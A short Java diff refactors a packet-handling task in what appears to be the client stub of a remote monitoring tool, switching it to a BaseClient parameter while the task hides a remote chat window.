@@ -1,12 +1,11 @@
 package me.jershdervis.monitorj.stub.client.tasks;
 
 import me.jershdervis.monitorj.stub.MonitorJStub;
+import me.jershdervis.monitorj.stub.client.BaseClient;
 import me.jershdervis.monitorj.stub.client.PacketTask;
 import me.jershdervis.monitorj.stub.client.Packets;
 import me.jershdervis.monitorj.stub.ui.RemoteChatWindow;
 
-import java.io.DataInputStream;
-import java.io.DataOutputStream;
 import java.io.IOException;
 
 /**
@@ -15,11 +14,11 @@ import java.io.IOException;
 public class RemoteChatStopTask extends PacketTask {
 
     public RemoteChatStopTask() {
-        super(Packets.REMOTE_CHAT_STOP);
+        super(Packets.REMOTE_CHAT_STOP.getPacketID());
     }
 
     @Override
-    public void run(DataInputStream inputStream, DataOutputStream outputStream) throws IOException {
+    public void run(BaseClient client) throws IOException {
         //Hide the RemoteChat JFrame
         RemoteChatWindow chatWindow = MonitorJStub.getInstance().getChatWindow();
         chatWindow.setAlwaysOnTop(false);
